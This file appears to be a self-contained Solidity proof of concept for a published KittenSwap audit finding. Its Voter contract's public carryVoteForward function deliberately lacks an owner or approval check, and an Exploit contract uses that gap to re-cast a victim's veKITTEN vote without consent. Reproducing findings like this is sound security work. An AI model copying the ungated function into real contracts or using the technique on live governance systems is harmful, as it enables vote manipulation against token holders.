// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of KittenSwap finding 61953 (H-03):
// "Permissionless voting through `Voter::carryVoteForward()`".
//
// Audited source (Pashov Audit Group, KittenSwap security review 2025-07-31):
//   report github.com/pashov/audits/blob/master/team/md/KittenSwap-security-review_2025-07-31.md
//   file   Voter.sol
//   fn     carryVoteForward(uint256 _tokenId, uint256 _fromPeriod)
//
// Root cause: `carryVoteForward` is a `public` function with NO access control.
// It carries a veKITTEN's vote from a past period forward into the next period,
// but it never checks that `msg.sender` owns or is approved for `_tokenId`. The
// audit's fix is to prepend:
//     if (veKitten.isApprovedOrOwner(msg.sender, _tokenId) == false)
//         revert NotApprovedOrOwner();
// Because that check is missing, ANYONE can force any veKITTEN's previous vote to
// be re-cast for the next period without the owner's authorization — permissionless
// vote manipulation of the ve(3,3) gauge weights.
//
// VERBATIM: the finding's embedded snippet (the `public` declaration + the first
// two body lines using `IVoter.Period storage ps` and `getCurrentPeriod() + 1`)
// is reproduced byte-for-byte; the @> line is the exact vulnerable line the audit
// marks (the un-gated public entrypoint). The remainder of the carry-forward body
// (read the from-period's voted pools/weights and replay them via `_vote`) is a
// faithful reconstruction of the described mechanism, matching the audit text:
// "anyone can ... vote for the next period ... by copying a previous vote".
//
// Faithful minimal doubles (non-vulnerable dependencies): the veKITTEN NFT
// (ownerOf / approve / isApprovedOrOwner), the epoch clock (getCurrentPeriod), the
// gauge registry, the per-period vote storage, and the authorization-gated owner
// `vote()` path used to seed the original legitimate vote.
// ─────────────────────────────────────────────────────────────────────────────

address constant SINK = 0x000000000000000000000000000000000000D00d;

/// @dev Declares the `Period` storage type exactly as referenced on the verbatim
///      line `IVoter.Period storage ps = period[_fromPeriod];`.
interface IVoter {
    struct Period {
        // tokenId => list of pools the tokenId voted for in this period
        mapping(uint256 => address[]) tokenIdVotedList;
        // gauge => tokenId => vote weight applied to that gauge this period
        mapping(address => mapping(uint256 => uint256)) tokenIdVotes;
    }
}

/// @dev Faithful minimal veKITTEN NFT double. Real contract exposes
///      isApprovedOrOwner(spender, tokenId); we reproduce owner + single approval.
contract VeKitten {
    mapping(uint256 => address) public ownerOf;
    mapping(uint256 => address) public getApproved;

    function mint(address to, uint256 tokenId) external {
        ownerOf[tokenId] = to;
    }

    function approve(address to, uint256 tokenId) external {
        require(msg.sender == ownerOf[tokenId], "not owner");
        getApproved[tokenId] = to;
    }

    function isApprovedOrOwner(address spender, uint256 tokenId) external view returns (bool) {
        return spender == ownerOf[tokenId] || spender == getApproved[tokenId];
    }
}

/// @dev Faithful minimal marker ERC20 used to record the HARM magnitude (the
///      unauthorized vote weight carried forward) at the SINK, since the harm is a
///      governance-state manipulation with no positive token transfer to the attacker.
contract MarkerToken {
    string public name = "KittenSwap Unauthorized Vote Weight";
    string public symbol = "veVOTE";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract — `carryVoteForward` reproduced with the finding's verbatim
// signature/first lines and the missing access control (@> line).
// ─────────────────────────────────────────────────────────────────────────────
contract Voter {
    struct GaugeInfo {
        address gauge;
    }

    VeKitten public veKitten;

    // pool => gauge info (the gauge registry)
    mapping(address => GaugeInfo) public gauge;

    // periodId => Period storage
    mapping(uint256 => IVoter.Period) internal period;

    // periodId => pool => total vote weight cast for that pool (aggregate gauge weight)
    mapping(uint256 => mapping(address => uint256)) public poolWeight;

    // Faithful epoch-clock double: real getCurrentPeriod() derives from
    // block.timestamp / EPOCH_DURATION. Kept deterministic for the PoC.
    uint256 public curPeriod;

    constructor(VeKitten _veKitten) {
        veKitten = _veKitten;
    }

    function getCurrentPeriod() public view returns (uint256) {
        return curPeriod;
    }

    function advancePeriod() external {
        curPeriod += 1;
    }

    function setGauge(address _pool, address _gauge) external {
        gauge[_pool].gauge = _gauge;
    }

    /// @notice Records votes for `_period` on behalf of `_tokenId`.
    function _vote(
        uint256 _period,
        uint256 _tokenId,
        address[] memory _poolList,
        uint256[] memory _weightList
    ) internal {
        IVoter.Period storage ps = period[_period];
        for (uint256 i; i < _poolList.length; i++) {
            address _pool = _poolList[i];
            address _gauge = gauge[_pool].gauge;
            uint256 _w = _weightList[i];
            ps.tokenIdVotedList[_tokenId].push(_pool);
            ps.tokenIdVotes[_gauge][_tokenId] += _w;
            poolWeight[_period][_pool] += _w;
        }
    }

    /// @notice Authorization-gated owner voting path (faithful — this is how a
    ///         legitimate vote is seeded, WITH the ownership check the vulnerable
    ///         function is missing).
    function vote(
        uint256 _tokenId,
        address[] calldata _poolList,
        uint256[] calldata _weightList
    ) external {
        require(veKitten.isApprovedOrOwner(msg.sender, _tokenId), "NotApprovedOrOwner");
        _vote(getCurrentPeriod() + 1, _tokenId, _poolList, _weightList);
    }

    /// @notice Carry forward votes from past period
    function carryVoteForward(uint256 _tokenId, uint256 _fromPeriod) public { // @> VULN: public, no `veKitten.isApprovedOrOwner(msg.sender, _tokenId)` gate — anyone can re-cast any veKITTEN's vote for the next period
        IVoter.Period storage ps = period[_fromPeriod];
        uint256 nextPeriod = getCurrentPeriod() + 1;

        address[] memory _poolList = ps.tokenIdVotedList[_tokenId];
        uint256[] memory _weightList = new uint256[](_poolList.length);
        for (uint256 i; i < _poolList.length; i++) {
            address _gauge = gauge[_poolList[i]].gauge;
            _weightList[i] = ps.tokenIdVotes[_gauge][_tokenId];
        }

        _vote(nextPeriod, _tokenId, _poolList, _weightList);
    }
}

/// @dev The honest veKITTEN owner. Mints its NFT and casts a legitimate vote for
///      period 1 through the access-controlled `vote()` path.
contract Victim {
    constructor(VeKitten veKitten, Voter voter, uint256 tokenId, address pool, uint256 weight) {
        veKitten.mint(address(this), tokenId);
        address[] memory pools = new address[](1);
        pools[0] = pool;
        uint256[] memory weights = new uint256[](1);
        weights[0] = weight;
        voter.vote(tokenId, pools, weights); // lands in getCurrentPeriod()+1 == period 1
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: an unauthorized third party (this contract) carries the victim's
// past vote forward into the next period, proving permissionless vote manipulation.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    MarkerToken public marker;
    VeKitten public veKitten;
    Voter public voter;
    Victim public victim;

    uint256 public constant TOKEN_ID = 42; // the victim's veKITTEN
    uint256 public constant FROM_PERIOD = 1; // period the victim originally voted in
    uint256 public constant VOTE_WEIGHT = 1000e18; // victim's voting power
    address public constant POOL = address(0xB00B); // a KittenSwap pool
    address public constant GAUGE = address(0x6A06); // its gauge

    uint256 public carriedWeight; // unauthorized vote weight cast for next period

    constructor() {
        marker = new MarkerToken(); // child nonce 1 (harm marker)
        veKitten = new VeKitten(); // child nonce 2
        voter = new Voter(veKitten); // child nonce 3 (VULN)

        // register the gauge, then the honest owner casts a legitimate vote for period 1
        voter.setGauge(POOL, GAUGE);
        victim = new Victim(veKitten, voter, TOKEN_ID, POOL, VOTE_WEIGHT); // child nonce 4
    }

    function run() external {
        // epoch advances: current period is now 1, so the next votable period is 2
        voter.advancePeriod();
        require(voter.getCurrentPeriod() == FROM_PERIOD, "clock setup");

        uint256 nextPeriod = FROM_PERIOD + 1;

        // Precondition: the attacker (this contract) is NEITHER owner NOR approved
        // for the victim's veKITTEN, and period 2 currently has no vote for the pool.
        require(!veKitten.isApprovedOrOwner(address(this), TOKEN_ID), "attacker unexpectedly authorized");
        require(voter.poolWeight(nextPeriod, POOL) == 0, "next period already voted");

        // ── the permissionless call: no owner/approval required ──
        voter.carryVoteForward(TOKEN_ID, FROM_PERIOD);

        // The victim's full voting power was re-cast for the next period without consent.
        carriedWeight = voter.poolWeight(nextPeriod, POOL);

        // record the harm magnitude (unauthorized vote weight) at the SINK
        marker.mint(SINK, carriedWeight);

        // harm: an unauthorized vote of the victim's full weight was carried forward
        require(carriedWeight == VOTE_WEIGHT, "vote not carried forward");
        require(marker.balanceOf(SINK) == VOTE_WEIGHT, "harm not recorded at sink");
    }
}
